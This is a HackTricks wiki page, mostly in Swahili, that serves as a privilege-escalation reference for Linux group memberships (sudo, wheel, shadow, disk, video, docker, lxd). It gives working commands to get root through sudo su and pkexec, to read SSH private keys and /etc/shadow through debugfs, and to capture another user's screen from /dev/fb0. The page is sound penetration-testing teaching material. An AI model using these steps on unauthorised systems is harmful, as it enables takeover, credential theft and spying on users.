{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Groups

## **PE - Method 1**

**Wakati mwingine**, **kwa kawaida \(au kwa sababu programu fulani inahitaji hivyo\)** ndani ya **/etc/sudoers** faili unaweza kupata baadhi ya mistari hii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
```text
sudo su
```
## PE - Method 2

Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa unapata kwamba binary pkexec ni binary ya SUID na unategemea sudo au admin, huenda unaweza kutekeleza binaries kama sudo ukitumia pkexec. 
Angalia maudhui ya:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utapata ni kundi gani lina ruhusa ya kutekeleza **pkexec** na **kwa default** katika baadhi ya linux zinaweza **kuonekana** baadhi ya makundi **sudo au admin**.

Ili **kuwa root unaweza kutekeleza**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ikiwa unajaribu kutekeleza **pkexec** na unapata **makosa** haya:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sessions 2 tofauti za ssh**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**Wakati mwingine**, **kwa default** ndani ya faili ya **/etc/sudoers** unaweza kupata mstari huu:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la wheel anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
```text
sudo su
```
# Shadow Group

Watumiaji kutoka **kikundi shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

# Disk Group

Hii haki ni karibu **sawa na ufikiaji wa root** kwani unaweza kufikia data zote ndani ya mashine.

Files:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** \(kama `/etc/shadow` au `/etc/passwd`\) utapata kosa la "**Ruhusa imekataliwa**".

# Kundi la Video

Kwa kutumia amri `w` unaweza kupata **nani aliyeingia kwenye mfumo** na itakuonyesha matokeo kama ifuatavyo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
The **tty1** inamaanisha kwamba mtumiaji **yossi amejiandikisha kimwili** kwenye terminal kwenye mashine.

Kikundi cha **video** kina ufikiaji wa kuangalia matokeo ya skrini. Kimsingi unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** katika data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuhifadhiwa katika `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ili **kufungua** **picha ya raw** unaweza kutumia **GIMP**, chagua faili **`screen.raw`** na chagua kama aina ya faili **Data ya picha ya raw**:

![](../../.gitbook/assets/image%20%28208%29.png)

Kisha badilisha Upana na Kimo kuwa zile zinazotumika kwenye skrini na angalia Aina tofauti za Picha \(na uchague ile inayoonyesha vizuri skrini\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Kundi la Root

Inaonekana kama kwa kawaida **wanachama wa kundi la root** wanaweza kuwa na ufikiaji wa **kubadilisha** baadhi ya faili za usanidi wa **huduma** au baadhi ya faili za **maktaba** au **mambo mengine ya kuvutia** ambayo yanaweza kutumika kuongeza mamlaka...

**Angalia ni faili zipi wanachama wa root wanaweza kubadilisha**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

Unaweza kuunganisha mfumo wa faili wa mwenyeji kwenye kiasi cha mfano, hivyo wakati mfano unapoanza, mara moja inachaji `chroot` kwenye kiasi hicho. Hii inakupa root kwenye mashine.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kujenga na **kujiendesha** kwa urahisi kazi zinazotolewa na zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
